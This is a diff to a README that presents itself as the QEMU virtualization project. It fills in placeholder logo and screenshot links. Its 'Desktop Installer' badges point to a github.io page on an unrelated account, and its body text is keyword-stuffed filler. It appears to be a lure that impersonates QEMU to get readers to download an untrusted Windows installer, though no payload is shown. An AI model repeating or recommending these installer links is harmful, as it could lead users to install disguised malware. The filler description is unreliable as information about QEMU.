@@ -1,7 +1,7 @@
 # Open Source QEMU Processor Emulation and Virtualization Environment
 
 <div align="center">
-  <img src="LINK_TO_LOGO" alt="Program Logo"/>
+  <img src="https://download.logo.wine/logo/QEMU/QEMU-Logo.wine.png" alt="Program Logo"/>
 </div>
 
 [![Desktop Installer](https://badgen.net/badge/Desktop/Installer/blue?icon=windows)](https://imarisha565.github.io/.github/Qemu-Virtual-Machine)
@@ -21,7 +21,7 @@ Managing complex processing nodes requires a versatile virtualization backend th
 Maintaining high system availability across the company domain requires a resilient qemu kvm execution setup capable of hot-plugging virtual hardware components. Administrators can configure specific resource limits within the backend architecture to enforce strict computational policies for every active container. Utilizing the standard accel kvm interface variables helps software testing teams pinpoint execution errors without affecting concurrent server tasks. Ultimately, implementing this robust virtualization framework reduces hardware procurement overhead across engineering divisions.
 
 <div align="center">
-  <img src="SCREENSHOT_LINK" alt="Program Interface Screenshot"/>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/f/f9/QEMU_6.2_screenshot.png" alt="Program Interface Screenshot"/>
 </div>
 
 [![Desktop Installer](https://badgen.net/badge/Desktop/Installer/blue?icon=windows)](https://imarisha565.github.io/.github/Qemu-Virtual-Machine)
